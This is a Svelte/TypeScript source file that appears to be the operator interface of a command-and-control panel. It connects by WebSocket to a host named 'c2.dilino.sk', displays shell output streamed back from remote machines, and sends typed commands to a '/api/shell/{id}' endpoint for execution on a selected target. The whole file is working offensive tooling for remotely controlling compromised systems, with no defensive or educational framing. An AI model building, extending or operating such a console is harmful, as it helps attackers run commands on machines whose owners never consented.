<script lang="ts">
	import { page } from '$app/stores';
	import { onMount } from 'svelte';
	import type { Message } from '$lib/types';

	let output: string[] = [];
	let command: string = '';
	let ws: WebSocket;

	onMount(() => {
		ws = new WebSocket('ws://c2.dilino.sk/ws');
		ws.onmessage = (event: MessageEvent) => {
			const msg: Message = JSON.parse(event.data);
			if (msg.type === 'shell_output') {
				output = [...output, String(msg.data)];
			}
		};
		return () => ws.close();
	});

	async function sendCommand() {
		if (!command.trim()) return;
		const res = await fetch(`/api/shell/${$page.params.id}`, {
			method: 'POST',
			headers: { 'Content-Type': 'application/json' },
			body: JSON.stringify({ command })
		});
		const data: { output: string } = await res.json();
		output = [...output, `> ${command}`, data.output];
		command = '';
	}
</script>

<div class="p-4 bg-gray-800 rounded">
	<h2 class="text-2xl mb-4">Shell: {$page.params.id}</h2>
	<div class="bg-black p-4 rounded h-96 overflow-y-auto font-mono">
		{#each output as line}
			<p>{line}</p>
		{/each}
	</div>
	<div class="mt-4">
		<input
			bind:value={command}
			on:keydown={(e: KeyboardEvent) => e.key === 'Enter' && sendCommand()}
			class="w-full p-2 bg-gray-900 rounded"
			placeholder="Enter command..."
		/>
	</div>
</div>